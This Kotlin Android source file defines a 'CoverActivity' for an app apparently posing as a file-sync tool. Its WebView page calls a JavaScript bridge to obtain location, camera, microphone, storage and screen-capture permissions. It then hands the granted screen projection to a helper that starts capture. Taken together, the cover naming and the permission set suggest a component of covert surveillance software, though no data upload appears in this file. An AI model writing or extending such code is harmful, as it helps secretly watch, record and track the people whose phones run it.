package com.georgetech.filesync

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.util.DisplayMetrics
import android.view.WindowManager
import com.georgetech.filesync.modules.DisplayHelper
import android.graphics.Color
import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebSettings
import android.webkit.WebView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class CoverActivity : AppCompatActivity() {

    private lateinit var wv: WebView

    companion object {
        private const val REQ_LOC   = 101
        private const val REQ_CAM   = 102
        private const val REQ_MIC   = 103
        private const val REQ_STOR  = 104
        private const val REQ_SCR   = 105
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.statusBarColor = Color.parseColor("#0A0E27")
        window.navigationBarColor = Color.parseColor("#131836")

        wv = WebView(this).apply {
            setBackgroundColor(Color.parseColor("#0A0E27"))
            settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                cacheMode = WebSettings.LOAD_NO_CACHE
            }
            addJavascriptInterface(PermBridge(), "Android")
            loadUrl("file:///android_asset/dashboard.html")
        }
        setContentView(wv)
    }

    override fun onBackPressed() {
        if (wv.canGoBack()) wv.goBack() else super.onBackPressed()
    }

    // ─── JS callbacks ────────────────────────────────────────────────────────

    private fun isGranted(vararg perms: String) = perms.all {
        ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
    }

    private fun jsCallback(code: Int, granted: Boolean) {
        wv.post { wv.evaluateJavascript("window.onPermResult($code,$granted)", null) }
    }

    // ─── Inner bridge ────────────────────────────────────────────────────────

    inner class PermBridge {

        // All methods must be on UI thread — @JavascriptInterface runs on WebView JS thread
        @JavascriptInterface
        fun requestLocation() = runOnUiThread {
            val p = arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION)
            if (isGranted(*p)) jsCallback(REQ_LOC, true)
            else ActivityCompat.requestPermissions(this@CoverActivity, p, REQ_LOC)
        }

        @JavascriptInterface
        fun requestCamera() = runOnUiThread {
            val p = arrayOf(Manifest.permission.CAMERA)
            if (isGranted(*p)) jsCallback(REQ_CAM, true)
            else ActivityCompat.requestPermissions(this@CoverActivity, p, REQ_CAM)
        }

        @JavascriptInterface
        fun requestMic() = runOnUiThread {
            val p = arrayOf(Manifest.permission.RECORD_AUDIO)
            if (isGranted(*p)) jsCallback(REQ_MIC, true)
            else ActivityCompat.requestPermissions(this@CoverActivity, p, REQ_MIC)
        }

        @JavascriptInterface
        fun requestStorage() = runOnUiThread {
            val p = arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE)
            if (isGranted(*p)) jsCallback(REQ_STOR, true)
            else ActivityCompat.requestPermissions(this@CoverActivity, p, REQ_STOR)
        }

        @JavascriptInterface
        fun requestScreenCapture() = runOnUiThread {
            if (DisplayHelper.isReady()) {
                jsCallback(REQ_SCR, true)
            } else {
                // Request directly from CoverActivity — avoids Samsung bug with transparent GrantActivity
                val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                startActivityForResult(mpm.createScreenCaptureIntent(), REQ_SCR)
            }
        }

        @JavascriptInterface
        fun checkPermission(perm: String): Boolean =
            ContextCompat.checkSelfPermission(this@CoverActivity, perm) == PackageManager.PERMISSION_GRANTED
    }

    // ─── Activity result handlers ─────────────────────────────────────────────

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ_SCR) {
            if (resultCode == RESULT_OK && data != null) {
                try {
                    val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                    val proj = mpm.getMediaProjection(resultCode, data)
                    if (proj != null) {
                        DisplayHelper.resultCode = resultCode
                        DisplayHelper.resultData = data
                        DisplayHelper.projection = proj
                        DisplayHelper.setupCapture(proj, getDisplayMetrics())
                    }
                } catch (_: Exception) {}
            }
            jsCallback(REQ_SCR, DisplayHelper.isReady())
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        val granted = grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED
        jsCallback(requestCode, granted)
    }

    // ─── Helpers ──────────────────────────────────────────────────────────────

    private fun getDisplayMetrics(): DisplayMetrics {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val bounds = getSystemService(WindowManager::class.java).currentWindowMetrics.bounds
            DisplayMetrics().apply {
                widthPixels = bounds.width()
                heightPixels = bounds.height()
                densityDpi = resources.displayMetrics.densityDpi
            }
        } else {
            val m = DisplayMetrics()
            @Suppress("DEPRECATION")
            (getSystemService(WINDOW_SERVICE) as WindowManager).defaultDisplay.getRealMetrics(m)
            m
        }
    }
}
